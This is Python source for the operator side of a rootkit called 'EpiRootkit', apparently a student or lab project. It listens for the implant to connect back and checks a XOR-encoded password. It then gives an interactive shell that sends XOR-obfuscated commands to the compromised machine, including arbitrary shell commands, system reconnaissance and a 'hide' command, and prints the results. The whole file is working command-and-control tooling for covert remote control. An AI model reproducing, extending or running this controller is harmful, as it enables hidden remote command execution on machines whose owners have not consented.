import argparse
import socket
import logging
import sys
import os
import time

XOR_KEY = 0x2A
EOF_MARKER = "--EOF--"
STDERR_MARKER = "--STDERR--"
STATUS_MARKER = "--STATUS--"


def xor_encrypt_decrypt(data: bytes) -> bytes:
    return bytes(b ^ XOR_KEY for b in data)


class EpiRootkitClient:
    def __init__(self, host: str, port: int, password: str):
        self.host = host
        self.port = port
        self.password = password
        self.remote_dir = "/"

        logging.basicConfig(
            level=logging.INFO,
            format='[%(levelname)s %(asctime)s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(1)

    def start(self):
        logging.info("[*] Listening on %s:%d for incoming connections", self.host, self.port)
        try:
            while True:
                conn, addr = self.server_socket.accept()
                logging.info("[+] Incoming connection from %s:%d", *addr)
                if not self._authenticate(conn):
                    logging.warning("[-] Authentication failed")
                    conn.close()
                    continue
                logging.info("[+] Authentication successful")
                try:
                    self._handle_session(conn)
                except Exception as e:
                    logging.error("Session error: %s", str(e))
                finally:
                    conn.close()
                    logging.info("[*] Connection closed. Waiting for reconnection...")
        except KeyboardInterrupt:
            logging.info("Server shutting down.")
        finally:
            self.server_socket.close()

    def _authenticate(self, conn: socket.socket) -> bool:
        encrypted_pw = xor_encrypt_decrypt(self.password.encode())
        conn.sendall(encrypted_pw)
        conn.settimeout(5.0)
        try:
            data = conn.recv(1024)
        except socket.timeout:
            return False
        finally:
            conn.settimeout(None)
        if not data:
            return False
        return xor_encrypt_decrypt(data).decode().strip() == "OK"

    def _handle_session(self, conn: socket.socket):
        while True:
            try:
                cmd = input("epirootkit> ")
            except EOFError:
                break
            if not cmd:
                continue
            if cmd == "exit" or cmd == "quit":
                conn.sendall(xor_encrypt_decrypt(cmd.encode()))
                break
            elif cmd == "!clear":
                os.system("clear")
                continue
            elif cmd == "!ping":
                start = time.time()
                conn.sendall(xor_encrypt_decrypt(b"PING"))
                conn.settimeout(2.0)
                try:
                    pong = conn.recv(1024)
                    latency = (time.time() - start) * 1000
                    print(f"[INFO] Ping response: {xor_encrypt_decrypt(pong).decode()} ({latency:.0f} ms)")
                except socket.timeout:
                    print("[ERROR] No response from rootkit.")
                finally:
                    conn.settimeout(None)
                continue
            elif cmd.startswith("!cd "):
                self.remote_dir = cmd[4:].strip()
                continue
            elif cmd == "!sysinfo":
                cmd = "uname -a && uptime && whoami"
            elif cmd.startswith("!hide "):
                cmd = cmd[1:]  # remove leading !

            full_cmd = f"cd {self.remote_dir} && {cmd}"
            logging.info("Command: %s", cmd)
            encrypted = xor_encrypt_decrypt(full_cmd.encode())
            conn.sendall(encrypted)

            output, stderr, status = [], [], None
            buffer = ""
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    print("[ERROR] Disconnected.")
                    return
                text = xor_encrypt_decrypt(chunk).decode(errors="ignore")
                buffer += text
                if EOF_MARKER in buffer:
                    break

            parts = buffer.split(EOF_MARKER)[0]
            if STDERR_MARKER in parts:
                stdout_part, rest = parts.split(STDERR_MARKER, 1)
                if STATUS_MARKER in rest:
                    stderr_part, status_part = rest.split(STATUS_MARKER, 1)
                else:
                    stderr_part, status_part = rest, ""
            else:
                stdout_part, stderr_part, status_part = parts, "", ""

            for line in stdout_part.strip().splitlines():
                print(f"[OUTPUT] {line}")
            for line in stderr_part.strip().splitlines():
                print(f"[ERROR] {line}")
            status_clean = status_part.strip()
            if status_clean:
                code = int(status_clean) if status_clean.isdigit() else -1
                label = "Success" if code == 0 else "Failure"
                print(f"[STATUS] Exit code: {code} ({label})")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--password", default="secret")
    args = parser.parse_args()

    client = EpiRootkitClient(args.host, args.port, args.password)
    client.start()
